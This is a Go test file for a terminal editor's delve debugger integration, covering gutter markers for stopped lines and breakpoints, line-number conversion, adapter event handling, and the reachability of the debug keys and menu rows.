// =============================================================================
// File: internal/app/debug_test.go
// Author: Vonzelle Brown
// Created: 2026-07-31
// Copyright: 2026 Vonzelle Brown. All rights reserved.
// =============================================================================

package app

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/gdamore/tcell/v2"

	"github.com/cloudmanic/spice-edit/internal/dap"
	"github.com/cloudmanic/spice-edit/internal/editor"
	"github.com/cloudmanic/spice-edit/internal/format"
	"github.com/cloudmanic/spice-edit/internal/state"
)

// debugFixture writes a small Go file and opens it, returning the app and path.
// Every test here needs a real file tab, because that is what the debugger's
// answers are painted onto.
func debugFixture(t *testing.T) (*App, string) {
	t.Helper()
	// A session registers this editor for debug queries; keep that out of the
	// real state directory.
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	dir := t.TempDir()
	path := filepath.Join(dir, "main.go")
	src := "package main\n\nimport \"fmt\"\n\nfunc add(a, b int) int {\n\tsum := a + b\n\treturn sum\n}\n\nfunc main() {\n\tfmt.Println(add(2, 3))\n}\n"
	if err := os.WriteFile(path, []byte(src), 0o644); err != nil {
		t.Fatal(err)
	}
	a := newTestApp(t, dir)
	a.openFile(path)
	if a.activeTabPtr() == nil {
		t.Fatal("fixture file did not open")
	}
	return a, path
}

// gutterRuneAt reads the leftmost gutter cell for a 0-based buffer line off the
// simulation screen. Reading the RENDERED screen rather than any intermediate
// state is the point: this fork has shipped overlay arithmetic that agreed with
// itself and disagreed with the pixels.
func gutterRuneAt(t *testing.T, a *App, line int) rune {
	t.Helper()
	tab := a.activeTabPtr()
	if tab == nil {
		t.Fatal("no active tab")
	}
	ex, ey, _, _ := a.editorRect()
	row := line - tab.ScrollY
	mainc, _, _, _ := a.screen.GetContent(ex, ey+row)
	return mainc
}

// TestDebugStoppedEventPaintsTheStoppedMarker is the definition of done for
// this stage, at the UI layer: when the adapter says the program stopped, the
// editor opens that file, moves the cursor there, and paints ▶ in the gutter.
//
// It asserts against the rendered simulation screen and against a 0-BASED
// cursor line, which is the boundary the whole coordinate conversion exists
// for: the event carries buffer coordinates, converted once in debug.go.
func TestDebugStoppedEventPaintsTheStoppedMarker(t *testing.T) {
	a, path := debugFixture(t)
	a.debug = &debugSession{adapter: "delve", running: true, bound: map[string][]boundBreakpoint{}}

	// Buffer line 5 (0-based) is `sum := a + b`, the 6th line of the fixture.
	const stoppedLine = 5
	if got := a.activeTabPtr().LineText(stoppedLine); !strings.Contains(got, "sum := a + b") {
		t.Fatalf("fixture line %d is %q, not the line the test means to stop on", stoppedLine, got)
	}

	a.handleDebugStopped(&debugStoppedEvent{
		when: time.Now(), path: path, line: stoppedLine,
		frame: "main.add", reason: "breakpoint", threadID: 1,
	})
	a.draw()

	if got := gutterRuneAt(t, a, stoppedLine); got != '▶' {
		t.Errorf("gutter cell on line %d is %q, want '▶'", stoppedLine, got)
	}
	// A marker painted on EVERY line would satisfy the assertion above.
	if got := gutterRuneAt(t, a, stoppedLine+1); got == '▶' {
		t.Errorf("line %d also got a stopped marker; only the stopped line may have one", stoppedLine+1)
	}
	if got := a.activeTabPtr().Cursor.Line; got != stoppedLine {
		t.Errorf("cursor is on 0-based line %d, want %d", got, stoppedLine)
	}
	if got := a.debugStatus(); !strings.Contains(got, "main.go:6") {
		t.Errorf("status = %q, want the 1-BASED line 6 for 0-based buffer line 5", got)
	}
	if !strings.Contains(a.debugStatus(), "main.add") {
		t.Errorf("status = %q, want the frame name", a.debugStatus())
	}
}

// TestDebugStoppedMarkerClearsWhenTheSessionEnds pins the other half: a program
// that finished must not leave ▶ painted under it. This is the visible symptom
// of the adapter-death trap, since a dead adapter reaches the same handler
// through internal/dap's synthetic terminated event.
func TestDebugStoppedMarkerClearsWhenTheSessionEnds(t *testing.T) {
	a, path := debugFixture(t)
	a.debug = &debugSession{adapter: "delve", running: true, bound: map[string][]boundBreakpoint{}}
	a.handleDebugStopped(&debugStoppedEvent{when: time.Now(), path: path, line: 5, reason: "breakpoint"})
	a.draw()
	if gutterRuneAt(t, a, 5) != '▶' {
		t.Fatal("precondition failed: the marker was never painted")
	}

	a.handleDAPTerminated(0, true)
	a.draw()

	if got := gutterRuneAt(t, a, 5); got == '▶' {
		t.Error("the stopped marker survived the program exiting; F5 is now bound to a dead client")
	}
	if a.debug != nil {
		t.Error("the session outlived the terminated event")
	}
	if got := a.debugStatus(); got != "" {
		t.Errorf("status = %q, want empty once the session is over", got)
	}
}

// TestSyntheticTerminatedFromAdapterDeathEndsTheSession covers the specific
// path internal/dap uses when the debugger CRASHES rather than exiting: it
// posts a terminated event with no body. The UI must not sit in "stopped".
func TestSyntheticTerminatedFromAdapterDeathEndsTheSession(t *testing.T) {
	a, path := debugFixture(t)
	a.debug = &debugSession{adapter: "delve", running: true, bound: map[string][]boundBreakpoint{}}
	a.handleDebugStopped(&debugStoppedEvent{when: time.Now(), path: path, line: 5, reason: "breakpoint"})

	a.handleDAPEvent(&debugEvent{when: time.Now(), ev: dap.Event{Type: dap.TypeEvent, Event: dap.EventTerminated}})

	if a.debug != nil {
		t.Fatal("a synthetic terminated event did not end the session")
	}
	a.draw()
	if got := gutterRuneAt(t, a, 5); got == '▶' {
		t.Error("the marker survived the adapter dying")
	}
}

// TestStoppedMarkerNeverDestroysABreakpoint is the regression guard for the bug
// that shaped this file's design.
//
// The obvious implementation of "paint ▶ on the stopped line" is
// tab.SetMark(line, Mark{Kind: MarkStopped}). Tab.Marks is keyed by line, so
// that REPLACES any breakpoint on the same line — and in this stage the only
// way to stop is on a breakpoint. syncBreakpoints then sees no MarkBreakpoint
// there, drops it from the authoritative list, and persists the deletion; quit
// while stopped and the breakpoint is gone for good. Measured before the
// overlay existed: one syncBreakpoints tick took a.breakpoints from 1 to 0.
func TestStoppedMarkerNeverDestroysABreakpoint(t *testing.T) {
	a, path := debugFixture(t)
	tab := a.activeTabPtr()

	const line = 5
	tab.SetMark(line, editor.Mark{Kind: editor.MarkBreakpoint, Enabled: true, VerifiedLine: -1})
	a.syncBreakpoints()
	if len(a.breakpoints) != 1 {
		t.Fatalf("precondition: expected 1 breakpoint, got %d", len(a.breakpoints))
	}

	a.debug = &debugSession{adapter: "delve", running: true, bound: map[string][]boundBreakpoint{}}
	a.handleDebugStopped(&debugStoppedEvent{when: time.Now(), path: path, line: line, reason: "breakpoint"})
	a.draw()

	// The marker is visible…
	if got := gutterRuneAt(t, a, line); got != '▶' {
		t.Fatalf("gutter on the stopped line is %q, want '▶'", got)
	}
	// …and the breakpoint underneath it is untouched, through a sync.
	a.syncBreakpoints()
	if len(a.breakpoints) != 1 {
		t.Fatalf("the breakpoint was DESTROYED by the stopped marker: a.breakpoints = %v", a.breakpoints)
	}
	m, ok := tab.MarkAt(line)
	if !ok || m.Kind != editor.MarkBreakpoint {
		t.Fatalf("the mark on line %d is %+v (exists=%v), want a MarkBreakpoint", line, m, ok)
	}
}

// TestBoundBreakpointsPaintWhereTheAdapterActuallyStops covers trap 5's UI
// half. A breakpoint the adapter MOVED must show a ● at the line it really
// bound, and one it could not bind at all must show a hollow ○ — otherwise the
// dot sits somewhere execution never reaches and the debugger looks like it is
// lying.
func TestBoundBreakpointsPaintWhereTheAdapterActuallyStops(t *testing.T) {
	a, path := debugFixture(t)
	tab := a.activeTabPtr()

	// The user marked line 3 (a blank line) and line 4 (`func add…`).
	tab.SetMark(3, editor.Mark{Kind: editor.MarkBreakpoint, Enabled: true, VerifiedLine: -1})
	tab.SetMark(4, editor.Mark{Kind: editor.MarkBreakpoint, Enabled: true, VerifiedLine: -1})

	a.debug = &debugSession{adapter: "delve", running: true}
	a.handleDebugStarted(&debugStartedEvent{
		when: time.Now(), adapter: "delve", client: nil,
		bound: map[string][]boundBreakpoint{path: {
			{ID: 1, Requested: 3, Bound: 3, Verified: false, Message: "no statement here"},
			{ID: 2, Requested: 4, Bound: 5, Verified: true},
		}},
	})
	a.draw()

	if got := gutterRuneAt(t, a, 3); got != '○' {
		t.Errorf("unbindable breakpoint on line 3 drew %q, want a hollow '○'", got)
	}
	if got := gutterRuneAt(t, a, 5); got != '●' {
		t.Errorf("the moved breakpoint did not draw at its BOUND line 5; got %q", got)
	}

	// The verification is written back onto the mark, without disturbing Kind.
	m, _ := tab.MarkAt(4)
	if m.Kind != editor.MarkBreakpoint {
		t.Errorf("mark kind changed to %v; syncBreakpoints would drop this breakpoint", m.Kind)
	}
	if !m.Verified || m.VerifiedLine != 5 {
		t.Errorf("mark = %+v, want Verified with VerifiedLine 5", m)
	}
	unverified, _ := tab.MarkAt(3)
	if unverified.Verified || unverified.VerifiedLine != -1 {
		t.Errorf("unverified mark = %+v, want Verified=false and VerifiedLine=-1", unverified)
	}
}

// TestAdapterLineConversionIsExactlyOneRoundTrip pins the 1-based/0-based
// boundary directly. Trap 6 is that a fixture whose numbers already agree
// proves nothing, so this asserts the two helpers are inverses and that the
// adapter's first line maps to the buffer's line 0 — not line 1.
func TestAdapterLineConversionIsExactlyOneRoundTrip(t *testing.T) {
	if got := bufLineFromAdapter(1); got != 0 {
		t.Errorf("adapter line 1 became buffer line %d, want 0", got)
	}
	if got := adapterLineFromBuf(0); got != 1 {
		t.Errorf("buffer line 0 became adapter line %d, want 1", got)
	}
	for buf := 0; buf < 50; buf++ {
		if got := bufLineFromAdapter(adapterLineFromBuf(buf)); got != buf {
			t.Fatalf("round trip of buffer line %d produced %d", buf, got)
		}
	}
	// An adapter that answers 0 (some do, for "unknown") must not become -1 and
	// index out of the buffer.
	if got := bufLineFromAdapter(0); got != 0 {
		t.Errorf("adapter line 0 became %d, want a clamped 0", got)
	}
}

// TestEnabledBreakpointsSkipsDisabledOnes checks a breakpoint the user switched
// off is never armed in the debugger — the same rule the dlv export follows.
func TestEnabledBreakpointsSkipsDisabledOnes(t *testing.T) {
	a, path := debugFixture(t)
	tab := a.activeTabPtr()
	tab.SetMark(4, editor.Mark{Kind: editor.MarkBreakpoint, Enabled: true, VerifiedLine: -1})
	tab.SetMark(5, editor.Mark{Kind: editor.MarkBreakpoint, Enabled: false, VerifiedLine: -1})
	a.syncBreakpoints()

	got := a.enabledBreakpoints()
	if len(got) != 1 {
		t.Fatalf("enabledBreakpoints returned %d entries, want only the enabled one: %v", len(got), got)
	}
	if got[0].Line != 4 || got[0].Path != path {
		t.Errorf("got %+v, want the enabled breakpoint on line 4", got[0])
	}
}

// TestGroupBreakpointsByPath pins the bucketing setBreakpoints requires: the
// request is per-source and whole-file, so a session with breakpoints in two
// files must issue two calls, each complete.
func TestGroupBreakpointsByPath(t *testing.T) {
	got := groupBreakpointsByPath([]Breakpoint{
		{Path: "/a/main.go", Line: 1},
		{Path: "/b/util.go", Line: 9},
		{Path: "/a/main.go", Line: 4},
	})
	if len(got) != 2 {
		t.Fatalf("got %d files, want 2", len(got))
	}
	if len(got["/a/main.go"]) != 2 {
		t.Errorf("main.go got %d breakpoints, want both of them in ONE call", len(got["/a/main.go"]))
	}
	if len(got["/b/util.go"]) != 1 {
		t.Errorf("util.go got %d breakpoints, want 1", len(got["/b/util.go"]))
	}
}

// TestBoundFromAnswersMatchesPositionally covers the pairing rule: the
// adapter's answer array carries no key back to the request other than its
// index. It also pins that an UNVERIFIED answer — which has no line at all —
// leaves Bound on the requested line rather than collapsing to line 0.
func TestBoundFromAnswersMatchesPositionally(t *testing.T) {
	asked := []Breakpoint{{Line: 4}, {Line: 10}, {Line: 20}}
	answers := []dap.Breakpoint{
		{ID: 1, Verified: true, Line: 7}, // adapter moved it: 1-based 7 -> buffer 6
		{Verified: false, Message: "no statement"},
		{ID: 3, Verified: true, Line: 21}, // 1-based 21 -> buffer 20, unmoved
	}
	got := boundFromAnswers(asked, answers, false)
	if len(got) != 3 {
		t.Fatalf("got %d entries, want 3", len(got))
	}
	if got[0].Requested != 4 || got[0].Bound != 6 || !got[0].Verified {
		t.Errorf("first = %+v, want requested 4 bound 6 verified", got[0])
	}
	if got[1].Verified {
		t.Errorf("second = %+v, want unverified", got[1])
	}
	if got[1].Bound != 10 {
		t.Errorf("an unverified breakpoint's Bound collapsed to %d; it must stay on the "+
			"requested line 10 rather than line 0 of the file", got[1].Bound)
	}
	if got[2].Bound != 20 {
		t.Errorf("third = %+v, want bound 20", got[2])
	}

	// A short answer array (an adapter returning fewer entries than asked) must
	// not panic or mis-pair.
	short := boundFromAnswers(asked, []dap.Breakpoint{{Verified: true, Line: 5}}, false)
	if len(short) != 3 || short[1].Verified || short[2].Verified {
		t.Errorf("short answer produced %+v", short)
	}

	// An adapter that binds lazily turns the SAME unverified answer into a
	// pending one, and nothing else about the pairing changes.
	lazy := boundFromAnswers(asked, answers, true)
	if lazy[1].Verified {
		t.Errorf("lazy binding must not fake verification: %+v", lazy[1])
	}
	if !lazy[1].Pending || !lazy[1].WillBind() {
		t.Errorf("an unverified answer from a lazily-binding adapter is PENDING, not refused: %+v", lazy[1])
	}
	if lazy[0].Pending {
		t.Errorf("a verified answer must never be marked pending: %+v", lazy[0])
	}
	if got[1].Pending || got[1].WillBind() {
		t.Errorf("delve's unverified answer is a refusal and must stay one: %+v", got[1])
	}
}

// TestBreakpointEventFlipsVerification covers the late-resolution path: a
// breakpoint can go from unverified to verified after setBreakpoints already
// answered, and the gutter must stop showing a hollow ○ once it does.
func TestBreakpointEventFlipsVerification(t *testing.T) {
	a, path := debugFixture(t)
	tab := a.activeTabPtr()
	tab.SetMark(4, editor.Mark{Kind: editor.MarkBreakpoint, Enabled: true, VerifiedLine: -1})

	a.debug = &debugSession{
		adapter: "delve", running: true,
		bound: map[string][]boundBreakpoint{path: {{ID: 7, Requested: 4, Bound: 4, Verified: false}}},
	}
	a.draw()
	if got := gutterRuneAt(t, a, 4); got != '○' {
		t.Fatalf("precondition: line 4 drew %q, want '○'", got)
	}

	body, _ := json.Marshal(dap.BreakpointEvent{
		Reason:     "changed",
		Breakpoint: dap.Breakpoint{ID: 7, Verified: true, Line: 5}, // 1-based 5 -> buffer 4
	})
	a.handleDAPEvent(&debugEvent{when: time.Now(), ev: dap.Event{
		Type: dap.TypeEvent, Event: dap.EventBreakpoint, Body: body,
	}})
	a.draw()

	if got := gutterRuneAt(t, a, 4); got == '○' {
		t.Error("the breakpoint still draws hollow after the adapter verified it")
	}
	m, _ := tab.MarkAt(4)
	if !m.Verified {
		t.Errorf("mark = %+v, want Verified after the breakpoint event", m)
	}
}

// TestContinuedEventClearsTheMarker checks the adapter resuming on its own is
// handled. Without it, ▶ stays painted under a program that is running again.
func TestContinuedEventClearsTheMarker(t *testing.T) {
	a, path := debugFixture(t)
	a.debug = &debugSession{adapter: "delve", running: true, bound: map[string][]boundBreakpoint{}}
	a.handleDebugStopped(&debugStoppedEvent{when: time.Now(), path: path, line: 5, reason: "breakpoint"})
	a.draw()
	if gutterRuneAt(t, a, 5) != '▶' {
		t.Fatal("precondition: no marker to clear")
	}

	a.handleDAPEvent(&debugEvent{when: time.Now(), ev: dap.Event{Type: dap.TypeEvent, Event: dap.EventContinued}})
	a.draw()

	if got := gutterRuneAt(t, a, 5); got == '▶' {
		t.Error("the marker survived a continued event")
	}
	if a.debug == nil || a.debug.stopped {
		t.Error("the session should still exist and be running, not stopped")
	}
}

// TestOutputEventIsRecordedNotPrinted pins trap 8's app half: the debuggee's
// output is captured as data. Anything that wrote it to the process's real
// stdout would land on top of the tcell screen.
func TestOutputEventIsRecordedNotPrinted(t *testing.T) {
	a, _ := debugFixture(t)
	a.debug = &debugSession{adapter: "delve", running: true, bound: map[string][]boundBreakpoint{}}

	body, _ := json.Marshal(dap.OutputEvent{Category: "stdout", Output: "hello from the debuggee\n"})
	a.handleDAPEvent(&debugEvent{when: time.Now(), ev: dap.Event{
		Type: dap.TypeEvent, Event: dap.EventOutput, Body: body,
	}})

	if len(a.debug.output) != 1 || a.debug.output[0] != "hello from the debuggee" {
		t.Fatalf("output = %v, want the program's line recorded with its newline trimmed", a.debug.output)
	}
	// And it surfaces when the program ends, so a result is not invisible.
	a.handleDAPTerminated(0, true)
	if !strings.Contains(a.statusMsg, "hello from the debuggee") {
		t.Errorf("exit message %q does not include the program's last output", a.statusMsg)
	}
}

// TestOutputIsBounded checks a program printing in a loop cannot grow the
// session without limit.
func TestOutputIsBounded(t *testing.T) {
	a, _ := debugFixture(t)
	a.debug = &debugSession{adapter: "delve", running: true, bound: map[string][]boundBreakpoint{}}
	for i := 0; i < maxDebugOutput*3; i++ {
		body, _ := json.Marshal(dap.OutputEvent{Category: "stdout", Output: "line\n"})
		a.handleDAPEvent(&debugEvent{when: time.Now(), ev: dap.Event{
			Type: dap.TypeEvent, Event: dap.EventOutput, Body: body,
		}})
	}
	if len(a.debug.output) > maxDebugOutput {
		t.Errorf("output grew to %d lines, over the %d cap", len(a.debug.output), maxDebugOutput)
	}
}

// TestDebugEventsAreIgnoredWithoutASession checks a late event from a session
// the user already stopped cannot resurrect state or panic.
func TestDebugEventsAreIgnoredWithoutASession(t *testing.T) {
	a, path := debugFixture(t)
	a.debug = nil

	for _, name := range []string{
		dap.EventStopped, dap.EventContinued, dap.EventOutput, dap.EventTerminated,
		dap.EventExited, dap.EventBreakpoint, dap.EventThread, dap.EventCapabilities,
		dap.EventInitialized, dap.EventProcess,
	} {
		a.handleDAPEvent(&debugEvent{when: time.Now(), ev: dap.Event{Type: dap.TypeEvent, Event: name}})
	}
	a.handleDebugStopped(&debugStoppedEvent{when: time.Now(), path: path, line: 5})

	if a.debug != nil {
		t.Fatal("an event with no session created one")
	}
	a.draw() // must not panic
}

// TestDebugStatusReportsEachState covers the status line's three states, since
// "is it running" is otherwise invisible.
func TestDebugStatusReportsEachState(t *testing.T) {
	a, path := debugFixture(t)

	if got := a.debugStatus(); got != "" {
		t.Errorf("no session should render an empty status, got %q", got)
	}

	a.debug = &debugSession{adapter: "delve", starting: true}
	if got := a.debugStatus(); !strings.Contains(got, "starting") {
		t.Errorf("starting status = %q", got)
	}

	a.debug = &debugSession{adapter: "delve", running: true}
	if got := a.debugStatus(); !strings.Contains(got, "running") {
		t.Errorf("running status = %q", got)
	}

	a.debug = &debugSession{adapter: "delve", running: true, bound: map[string][]boundBreakpoint{}}
	a.handleDebugStopped(&debugStoppedEvent{when: time.Now(), path: path, line: 5, reason: "breakpoint", frame: "main.add"})
	got := a.debugStatus()
	for _, want := range []string{"stopped", "breakpoint", "main.go:6", "main.add"} {
		if !strings.Contains(got, want) {
			t.Errorf("stopped status %q is missing %q", got, want)
		}
	}
}

// TestStatusBarShowsTheDebugSession is the CALL-SITE oracle for debugStatus.
//
// 🔴 CLAUDE.md's hardest-won rule: a green unit test proves the function works,
// not that anyone can reach it. This fork has shipped complete, tested,
// documented features whose every caller was a _test.go file — three times. So
// this renders the real status bar and reads the text back out of the screen.
func TestStatusBarShowsTheDebugSession(t *testing.T) {
	a, path := debugFixture(t)
	a.debug = &debugSession{adapter: "delve", running: true, bound: map[string][]boundBreakpoint{}}
	a.handleDebugStopped(&debugStoppedEvent{when: time.Now(), path: path, line: 5, reason: "breakpoint", frame: "main.add"})

	// handleDebugStopped flashes, and the flash owns the left-hand text while it
	// lasts. Expire it so the persistent status is what gets rendered.
	a.statusUntil = time.Now().Add(-time.Second)

	// paint() goes through draw() AND Show(): a SimulationScreen serves
	// GetContents from the front buffer, so reading without a Show sees a blank
	// screen and every assertion below would fail for the wrong reason.
	screen := paint(t, a, 120, 40)
	lines := strings.Split(screen, "\n")
	row := lines[len(lines)-2] // draw leaves a trailing blank line from the final \n
	if !strings.Contains(row, "debug: stopped") {
		t.Fatalf("the status bar never renders debugStatus().\nrow: %q", row)
	}
	if !strings.Contains(row, "main.go:6") {
		t.Errorf("status row %q does not name the stopped location", row)
	}
}

// TestDebugKeysAreReachable is the call-site oracle for the F-key branch: it
// drives real key events through handleKey and checks each one reached its
// action. A binding placed after a `return` would be invisible to any test that
// called the methods directly.
func TestDebugKeysAreReachable(t *testing.T) {
	a, _ := debugFixture(t)

	// F9 toggles a breakpoint at the cursor.
	a.activeTabPtr().MoveCursorTo(editor.Position{Line: 5, Col: 0}, false)
	a.handleKey(tcell.NewEventKey(tcell.KeyF9, 0, tcell.ModNone))
	if m, ok := a.activeTabPtr().MarkAt(5); !ok || m.Kind != editor.MarkBreakpoint {
		t.Fatalf("F9 did not set a breakpoint: mark=%+v ok=%v", m, ok)
	}
	a.handleKey(tcell.NewEventKey(tcell.KeyF9, 0, tcell.ModNone))
	if _, ok := a.activeTabPtr().MarkAt(5); ok {
		t.Error("a second F9 did not clear the breakpoint")
	}

	// F5 with no adapter installed must report something rather than doing
	// nothing silently. (It never spawns anything here: the guard runs first.)
	a.debug = &debugSession{adapter: "delve", running: true} // pretend one is up
	a.handleKey(tcell.NewEventKey(tcell.KeyF5, 0, tcell.ModNone))
	if a.statusMsg == "" {
		t.Error("F5 produced no feedback at all")
	}

	// F6 pause with a session that has no client must not panic.
	a.statusMsg = ""
	a.handleKey(tcell.NewEventKey(tcell.KeyF6, 0, tcell.ModNone))
	if a.statusMsg == "" {
		t.Error("F6 produced no feedback at all")
	}

	// The three stepping keys each reach their OWN action (stage 3). Asserting
	// only "something was flashed" would pass with all three wired to the same
	// method, which is exactly the mistake a shared switch arm invites — so
	// each refusal names the action it came from.
	a.debug = nil
	for _, tc := range []struct {
		key  tcell.Key
		want string
	}{
		{tcell.KeyF10, "Step over"},
		{tcell.KeyF11, "Step into"},
		{tcell.KeyF12, "Step out"},
	} {
		a.statusMsg = ""
		a.handleKey(tcell.NewEventKey(tc.key, 0, tcell.ModNone))
		if !strings.Contains(a.statusMsg, tc.want) {
			t.Errorf("key %v said %q, want a message naming %q", tc.key, a.statusMsg, tc.want)
		}
	}
}

// TestDebugKeysDoNotStealFromModals pins the placement rule: the F-key branch
// sits AFTER every modal guard, so a prompt that is up still owns the keyboard.
func TestDebugKeysDoNotStealFromModals(t *testing.T) {
	a, _ := debugFixture(t)
	a.openPrompt("Rename", "new name", "", func(*App, string) {})

	a.activeTabPtr().MoveCursorTo(editor.Position{Line: 5, Col: 0}, false)
	a.handleKey(tcell.NewEventKey(tcell.KeyF9, 0, tcell.ModNone))

	if _, ok := a.activeTabPtr().MarkAt(5); ok {
		t.Error("F9 set a breakpoint while a prompt modal was open")
	}
	if !a.promptOpen {
		t.Error("the prompt closed")
	}
}

// TestDebugMenuRowsAreReachable is the menu-side call-site oracle. Function
// keys are unreliable through a multiplexer, so the ≡ menu is the guaranteed
// path — and CLAUDE.md requires every action to be reachable there.
func TestDebugMenuRowsAreReachable(t *testing.T) {
	a, _ := debugFixture(t)
	items, _, _ := a.menuLayout()

	labels := make(map[string]menuItemDef, len(items))
	for _, it := range items {
		label := it.label
		if it.labelFor != nil {
			label = it.labelFor(a)
		}
		labels[label] = it
	}

	start, ok := labels["Start debugging"]
	if !ok {
		t.Fatalf("no 'Start debugging' row in the menu; got %v", keysOf(labels))
	}
	if start.action == nil {
		t.Error("the start row has no action")
	}
	if start.shortcut != "F5" {
		t.Errorf("start row advertises shortcut %q, want F5", start.shortcut)
	}
	if !start.enabled(a) {
		t.Error("start should be enabled with a Go file open")
	}

	stop, ok := labels["Stop debugging"]
	if !ok {
		t.Fatal("no 'Stop debugging' row in the menu")
	}
	if stop.enabled(a) {
		t.Error("stop should be disabled with no session")
	}

	// With a session up, the same row reads "Continue" while stopped.
	a.debug = &debugSession{adapter: "delve", running: true, stopped: true}
	if got := a.debugStartLabel(); got != "Continue" {
		t.Errorf("label while stopped = %q, want Continue", got)
	}
	if !stop.enabled(a) {
		t.Error("stop should be enabled with a session up")
	}
}

// keysOf lists a map's keys for a failure message.
func keysOf(m map[string]menuItemDef) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}

// TestLeaderTableStillRefusesReservedRunes guards the fork's binding contract
// while this stage adds keys: c / x / v stay unbound (the host terminal's
// clipboard owns them) and no Ctrl- binding was introduced.
func TestLeaderTableStillRefusesReservedRunes(t *testing.T) {
	for _, r := range []rune{'c', 'x', 'v'} {
		if leaderActionFor(r) != nil {
			t.Errorf("rune %q became bound; it is reserved for the terminal's own clipboard", r)
		}
	}
}

// TestMenuStartDebugGuardsBeforeSpawning checks the cheap refusals happen on
// the main goroutine and produce a message, without starting a process.
func TestMenuStartDebugGuardsBeforeSpawning(t *testing.T) {
	dir := t.TempDir()
	notGo := filepath.Join(dir, "notes.txt")
	if err := os.WriteFile(notGo, []byte("hello\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	a := newTestApp(t, dir)
	a.openFile(notGo)

	a.menuStartDebug()
	if a.debug != nil {
		t.Fatal("a debug session was started for a .txt file")
	}
	if !strings.Contains(a.statusMsg, "debug") && !strings.Contains(a.statusMsg, "Go file") {
		t.Errorf("status %q does not explain why nothing happened", a.statusMsg)
	}

	// A second start while one is coming up must not spawn a second adapter.
	a.debug = &debugSession{adapter: "delve", starting: true}
	a.menuStartDebug()
	if !a.debug.starting {
		t.Error("the in-flight session was replaced")
	}
	if !strings.Contains(a.statusMsg, "already running") {
		t.Errorf("status %q does not say a session is already running", a.statusMsg)
	}
}

// TestMenuDebugStopClearsImmediately checks Stop is instant in the UI: waiting
// for the adapter to confirm would leave ▶ painted over a program the user just
// stopped, which reads as the command not working.
func TestMenuDebugStopClearsImmediately(t *testing.T) {
	a, path := debugFixture(t)
	a.debug = &debugSession{adapter: "delve", running: true, bound: map[string][]boundBreakpoint{}}
	a.handleDebugStopped(&debugStoppedEvent{when: time.Now(), path: path, line: 5, reason: "breakpoint"})

	a.menuDebugStop()

	if a.debug != nil {
		t.Fatal("Stop left the session in place")
	}
	a.draw()
	if got := gutterRuneAt(t, a, 5); got == '▶' {
		t.Error("the marker survived Stop")
	}
}

// TestStopDebugSessionIsSafeWithoutOne pins that quitting with no debug session
// is a no-op rather than a panic, since Run calls this unconditionally.
func TestStopDebugSessionIsSafeWithoutOne(t *testing.T) {
	a, _ := debugFixture(t)
	a.debug = nil
	a.stopDebugSession() // must not panic
	if a.debug != nil {
		t.Error("stopDebugSession created a session")
	}
}

// TestDebugGutterPaintsOnWrappedTabs pins the fix for a real gap: the debug
// overlay used to stand down entirely on a wrapped tab, because `line - ScrollY`
// is off by the number of continuation rows above the line and painting at the
// wrong row is worse than not painting. A wrapped tab therefore showed no
// stopped arrow at all, and only the status bar said where execution had
// stopped. Tab.GutterRowFor now answers for both geometries.
//
// 🔴 The expected row is DERIVED FROM RENDERED OUTPUT, not recomputed: the tab
// is drawn once with no debug session to find which row actually carries the
// line, then drawn again with one to assert the arrow landed there. Asserting
// against a second copy of the wrap arithmetic would pass whenever the helper
// and the test were wrong together — the exact failure that let ScreenPos ship
// off-by-one twice under three green tests.
func TestDebugGutterPaintsOnWrappedTabs(t *testing.T) {
	a, path := debugFixture(t)
	tab := a.activeTabPtr()

	// Lines long enough that wrapping actually produces continuation rows; without
	// them a wrapped tab and an unwrapped one agree and the test proves nothing.
	long := strings.Repeat("xy ", 40)
	for i := 0; i < 3; i++ {
		tab.Buffer.Lines[i] = "// " + long
	}
	tab.Wrap = true
	tab.StyleStale = true

	const target = 5 // zero-based; the "sum := a + b" line

	// Pass 1: no debug session, so nothing overlays the gutter. Find the row that
	// actually carries this line by looking for its rendered line number.
	a.draw()
	a.screen.Show()
	scr := a.screen.(tcell.SimulationScreen)
	wantRow := -1
	for y := 0; y < a.height; y++ {
		if strings.Contains(screenLine(scr, y), fmtLineNo(target+1)+" ") {
			wantRow = y
			break
		}
	}
	if wantRow < 0 {
		t.Fatalf("fixture never rendered line %d on a wrapped tab", target+1)
	}

	// Pass 2: stopped on that line. The arrow must land on the row pass 1 found.
	a.debug = &debugSession{adapter: "delve", running: true, bound: map[string][]boundBreakpoint{}}
	a.handleDebugStopped(&debugStoppedEvent{when: time.Now(), path: path, line: target, reason: "breakpoint"})
	tab.Wrap = true
	a.draw()
	a.screen.Show()

	ex, _, _, _ := a.editorRect()
	got, _, _, _ := scr.GetContent(ex, wantRow)
	if got != '▶' {
		t.Fatalf("wrapped tab: gutter cell at the line's own row %d is %q, want %q",
			wantRow, string(got), "▶")
	}
	if !strings.Contains(a.debugStatus(), "main.go:6") {
		t.Errorf("status %q lost the location on a wrapped tab", a.debugStatus())
	}
}

// fmtLineNo renders a line number the way the gutter does, so the test can find
// the row by reading the screen rather than by recomputing wrap geometry.
func fmtLineNo(n int) string { return strconv.Itoa(n) }

// requireDlvForApp is the anti-skip gate for the app-level live oracle, matching
// internal/dap/live_dlv_test.go: skip when delve is absent so a fresh clone
// stays green, fail when HERDR_REQUIRE_DAP=1 says it must be there.
func requireDlvForApp(t *testing.T) {
	t.Helper()
	if _, err := exec.LookPath("dlv"); err != nil {
		msg := "dlv is not installed — `go install github.com/go-delve/delve/cmd/dlv@latest`"
		if os.Getenv("HERDR_REQUIRE_DAP") == "1" {
			t.Fatalf("HERDR_REQUIRE_DAP=1 but the live app oracle could not run: %s", msg)
		}
		t.Skip(msg)
	}
}

// pumpEvents drains the tcell queue into handleEvent until pred is satisfied or
// the deadline passes — a stand-in for Run's loop, which a test cannot use
// because Run blocks forever.
//
// This is what makes the oracle below an END-TO-END test rather than another
// unit test: every event travels the real path, from the adapter's read
// goroutine through a.post onto the tcell queue and into a.handleEvent.
func pumpEvents(t *testing.T, a *App, timeout time.Duration, pred func() bool) bool {
	t.Helper()
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		if pred() {
			return true
		}
		if a.screen.HasPendingEvent() {
			if ev := a.screen.PollEvent(); ev != nil {
				a.handleEvent(ev)
			}
			continue
		}
		time.Sleep(10 * time.Millisecond)
	}
	return pred()
}

